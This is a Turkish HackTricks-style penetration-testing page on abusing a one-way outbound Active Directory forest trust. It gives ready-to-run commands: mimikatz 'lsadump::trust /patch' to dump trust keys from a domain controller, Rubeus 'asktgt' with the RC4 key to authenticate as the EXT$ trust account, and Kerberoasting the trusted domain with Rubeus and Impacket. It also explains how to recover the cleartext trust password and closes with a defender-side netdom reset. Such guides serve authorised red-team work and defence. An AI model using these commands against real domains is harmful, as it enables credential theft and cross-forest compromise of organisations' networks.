# Harici Forest Domain - Tek Yönlü (Outbound)

{{#include ../../banners/hacktricks-training.md}}

Bu senaryoda **domain'iniz**, **farklı bir domain/forest** içindeki principal'lara bazı **yetkiler** **trust** etmektedir.

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
AD modülü mevcutsa, **Trusted Domain Object (TDO)** nesnesini doğrudan da inceleyin. Bu, kolay yolun **FSP/group abuse** mu yoksa **trust-account abuse** mu olduğuna karar verirken daha sonra ihtiyaç duyacağınız ham LDAP tabanlı trust verilerini sağlar:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Ayrıca `CN=ForeignSecurityPrincipals` içindeki foreign principal'lara gerçekte nerelerde erişim verildiğini de listelemelisiniz. Yaygın kazanımlar şunlardır:

- Mevcut domain'inizdeki bir server/DC üzerinde **Local admin**
- Kullanıcılar/bilgisayarlar/GPO'lar üzerinde ACL'lere sahip bir **custom domain group** üyeliği
- Daha sonra trust yapılandırması buna izin veriyorsa [RBCD](resource-based-constrained-delegation.md) hâline gelebilecek **computer objects** değiştirme hakları

## Trust Account Attack

Domain/forest **B**'den domain/forest **A**'ya (**B trusts A**) one-way trust oluşturulduğunda, **B** için bir **trust account** **A** içinde oluşturulur. **A**'nın outbound-trust görünümünde bu kullanışlıdır; çünkü daha sonra **B**'yi (trusting side) compromise ederseniz, trust secret'ı oradan dump edebilir ve `B$` olarak **A**'ya geri authenticate olabilirsiniz.<sup>[[1]](#references)</sup>

Burada anlaşılması gereken kritik nokta, bu trust account için password ve Kerberos material'ının, aşağıdakiler kullanılarak **trusting** domain'deki bir Domain Controller'dan extract edilebilmesidir:<sup>[[1]](#references)</sup>
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Bu, **trusted** domain içinde oluşturulan trust account'un etkin bir principal olması ve orada normal bir domain user'ın temel haklarına sahip olması sayesinde çalışır. Bu, genellikle LDAP enumerate etmeye, ticket talep etmeye ve bir sonraki escalation path'i bulmaya başlamak için yeterlidir.<sup>[[1]](#references)</sup>

`ext.local` **trusting** domain ve `root.local` **trusted** domain olduğunda, `root.local` içinde `EXT$` adlı bir user account oluşturulur. `ext.local` üzerinden trust key'leri dump etmek, `root.local` üzerinde `root.local\EXT$` olarak kullanılabilecek credentials'ları ortaya çıkarır:<sup>[[1]](#references)</sup>
```bash
lsadump::trust /patch
```
Bunu takiben, root.local içinde `root.local\EXT$` olarak kimlik doğrulaması yapmak için çıkarılan **RC4** anahtarını kullanın:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Ardından güvenilen domain'i bu principal olarak enumerate edin; örneğin `root.local` içindeki yüksek değerli bir SPN üzerinde Kerberoasting yaparak:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Linux'tan

**RC4** trust-account key'ini ele geçirdiyseniz, aynı yöntem Linux'tan Impacket ile çalışır:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Eğer **RC4** kabul edilmezse, kurtarılan **cleartext password**'a (veya türetilmiş **AES** anahtarlarına) geri dönün ve bu foothold üzerinden her zamanki [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) ve [Kerberoast](kerberoast.md) iş akışlarını yeniden kullanın.

### Key material gotchas

**trust keys** ile **trust-account credentials**'ı birbirine karıştırmayın:<sup>[[1]](#references)</sup>

- One-way trust'ta her iki taraf da bir **TDO** saklar, ancak gerçek **`EXT$` user account** yalnızca trusted domain'da bulunur.
- Mevcut trust-account password, TDO trust secret (`NewPassword` / current trust key) içinde yansıtılır.
- **RC4** trust key, `asktgt` ile trust account olarak yeniden kullanılabilecek en kolay artifact'tir; varsayılan kurulumlarda bu genellikle çalışan enctype'dir, çünkü trust account'ta çoğu zaman boş bir `msDS-SupportedEncryptionTypes` bulunur.
- **AES trust keys** açısından düşünüyorsanız, salt değerleri farklı olduğu için bunların trust-account AES keys ile birbirinin yerine kullanılamayacağını unutmayın.

Bu nedenle, bu sayfadaki teknik için dökülen **RC4** materyalini veya kurtarılan **cleartext password**'ı tercih edin.<sup>[[1]](#references)</sup>

### Gathering cleartext trust password

Önceki akışta **cleartext password** yerine trust hash'i kullanılmıştı (bu password da **mimikatz tarafından dump edilir**).<sup>[[1]](#references)</sup>

Cleartext password, mimikatz çıktısındaki \[ CLEAR ] değerinin hexadecimal'den dönüştürülmesi ve null byte'ların `\x00` kaldırılmasıyla elde edilebilir:<sup>[[1]](#references)</sup>

![Trust Account Attack - Gathering cleartext trust password: Cleartext password, mimikatz çıktısındaki ( CLEAR ) değerinin hexadecimal'den dönüştürülmesi ve null byte'ların kaldırılmasıyla elde edilebilir...](<../../images/image (938).png>)

Bazen bir trust relationship oluşturulurken trust için kullanıcı tarafından bir password girilmesi gerekir. Bu demonstrasyonda key, orijinal trust password'dır ve bu nedenle human readable'dır. Key rotate olduğunda (varsayılan: her 30 günde bir), cleartext genellikle human readable olmaktan çıkar, ancak teknik olarak hâlâ kullanılabilir.<sup>[[1]](#references)</sup>

Cleartext password, trust account olarak regular authentication gerçekleştirmek için, trust account'ın Kerberos secret key'i ile TGT istemeye alternatif olarak kullanılabilir. Burada `ext.local` üzerinden `root.local` sorgulanarak `Domain Admins` üyeleri listeleniyor:<sup>[[1]](#references)</sup>

![Trust Account Attack - Gathering cleartext trust password: Cleartext password, trust account olarak regular authentication gerçekleştirmek için, TGT istemeye alternatif olarak kullanılabilir...](<../../images/image (792).png>)

### Practical limitations

> [!WARNING]
> Trust accounts kullanışsız principal'lardır. **RUNAS / console / RDP** gibi interactive logon'lar burada beklenen yol değildir ve **NTLM** authentication denemeleri `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT` ile başarısız olabilir. Bunun yerine **Kerberos network logon** (`asktgt`, LDAP, CIFS, Kerberoast) planlayın.<sup>[[1]](#references)</sup>

### Persistence / cleanup note

Defenders, trusting domain'ın compromise edildiğini fark ederse `netdom trust ... /resetOneSide ...` ile trust secret'ı **her iki tarafta** rotate etmelidir. Operator açısından bunun önemi, **manual reset'in eski trust material'ını hemen geçersiz kılması**, normal trust-password rotation'ın ise rollover sırasında mevcut/önceki değerleri saklamaya devam etmesidir.<sup>[[2]](#references)</sup>
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Referanslar

- [1] [Alanlar arasında güvenlik sınırı olarak SID filter mi? (Bölüm 7) – Trust account saldırısı – trusting'den trusted'a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [2] [AD Forest Recovery – Trust password'ını sıfırlama](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
